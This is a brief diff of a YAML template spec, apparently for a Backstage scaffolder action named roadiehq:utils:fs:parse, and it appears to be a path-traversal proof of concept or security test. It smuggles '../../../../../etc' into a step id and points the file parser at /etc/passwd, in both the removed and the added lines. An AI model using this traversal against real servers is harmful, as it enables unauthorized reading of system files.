@@ -33,11 +33,11 @@ spec:
           example: ["ssss", 11,23,2323,24]
         expression: '$.example[0]'
         
-    - id: file
+    - id: file/../../../../../etc
       action: roadiehq:utils:fs:parse
       workspacePath: '/etc'
       input:
-        path: ../../../../../etc/passwd
+        path: passwd
         
     - id: log-message
       name: Log json
